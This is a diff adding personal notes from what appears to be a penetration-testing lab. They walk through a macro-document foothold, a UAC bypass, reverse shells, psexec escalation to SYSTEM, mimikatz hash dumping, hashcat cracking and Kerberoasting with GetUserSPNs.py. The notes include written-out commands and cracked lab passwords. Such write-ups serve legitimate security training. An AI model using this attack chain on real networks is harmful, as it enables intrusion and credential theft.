@@ -1,0 +1,31 @@
+------------------
+NOTES
+------------------
+
+After uploading the macro enabled docx file, can see that the user on .22 (alice) is medium leveled and need to level up in order to dump creds/ hashes
+
+Follow this guide for bypassing UAC: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+	C file is the best bet, make sure to change the curent dir to the file you want to be executed as higher permission
+	best for me was an msfvenom payload
+
+	upload psexec, the compiled exploit, and the new reverse shell to the victim
+		(exploit compiled with: i686-w64-mingw32-gcc main.c -o main)
+	start a listener for the reverse shell and run the exploit
+	a new shell will catch but still as user alice, however, this shell has high privs and can run psexec as system
+
+	create ANOTHER new shell on a different port, upload it, and start another listener
+		from the high priv session, run psexec on the newest shell to get a final SYSTEM callback
+			.\psexec.exe -i -accepteula -d -s c:\users\alice\desktop\shell-9002.exe
+
+	given system privs and can upload and run mimikatz to extract hashes with logonpasswords
+
+	crack hashes with hashcat and the pass.txt file from alice's desktop
+
+	query the TGT with Alice's cracked creds
+		python2 GetUserSPNs.py svcorp.com/alice:ThisIsTheUsersPassword01 -dc-ip 10.11.1.20 -request
+
+	get the service tickets and crack them with the same pass.txt wordlist
+
+		sqlServer:ThisIsTheUsersPassword23
+		HP3service:ThisIsTheUsersPassword24
+		extmailservice:ThisIsTheUsersPassword25
